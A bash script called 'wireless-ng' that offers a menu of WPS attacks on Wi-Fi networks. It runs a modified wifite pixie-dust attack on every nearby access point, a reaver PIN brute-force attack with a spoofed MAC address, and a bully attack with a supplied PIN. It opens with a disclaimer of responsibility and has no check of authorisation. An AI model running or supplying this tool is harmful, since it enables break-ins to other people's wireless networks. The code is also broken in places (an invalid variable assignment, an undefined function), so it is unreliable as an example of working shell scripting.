#!/bin/bash
# wireless-ng, version 1.50

# Warning :
# ----------
# I'm not responsible for anything.
# This script could be used anywhere without any consequences to me.

ROOT_UID = 0 # $UID = 0 is usually root.
E_NOTROOT = 87 # Non-root exit error.

# Run as root
if [ "$UID" -ne "$ROOT_UID" ]
	then
	echo "You're not running this script root previliges."
	echo "Do sudo ./wireless-ng or su && ./wireless-ng"
	exit $E_NOTROOT
fi

# User defined functions
pause() {
	read -p "Press [Enter] key to continue..."
	fackEnterKey
}

monitor() {
	ifconfig wlan1 down
	ifconfig wlan1 up
	sleep 3
}

one() {
	echo "You have selected choice $choice."
	sleep 2
	clear
	monitor
	wifite-ng --all --mac --pixie # Use modded wifite
	ifconfig wlan1 down # Switch off
	pause
}

two() {
	echo "You have selected choice $choice."
	sleep 2
	clear
	iwlist wlan0 scan | grep -E 'Address|ESSID'
	sleep 2
	echo "Please enter BSSID from above : "
	read BSSID
	monitor
	reaver -i wlan1 -b $BSSID -E -S -vvv -N -T 1 -t 20 -d 0 -l 420 -m 9e:49:1f:d6:37:f4
	ifconfig wlan1 down # Switch off
	pause
}

three() {
	echo "You have selected choice $choice."
	sleep 2
	clear
	iwlist wlan0 scan | grep 'Address|ESSID'
	echo "Please enter BSSID/ESSID from above : "
	read ESSID
	echo "Please enter the PIN : "
	read PIN
	monitor
	bully -e $ESSID -W --pin $PIN -B wlan1
	ifconfig wlan1 down # Switch off
	pause
}

four() {
ifconfig wlan1 down # Switch off if it's open from other options
exit 0
}

# MENU
menu() {
	clear
	echo "MENU :"
	echo "1. Pixiedust attack on all nearby access points."
	echo "2. Do a fresh PIN attack."
	echo "3. Do a used PIN attack."
	echo "4. Exit."
}

# INPUT
input() {
	read -p "Enter choice [ 1 - 4 ] : " choice
	case $choice in
		1) one ;;
		2) two ;;
		3) three ;;
		4) four ;;
		*) echo -e "Wrong choice. Please try again." && sleep 3
	esac
}

# MAIN
while true
do
	menu
	input
done
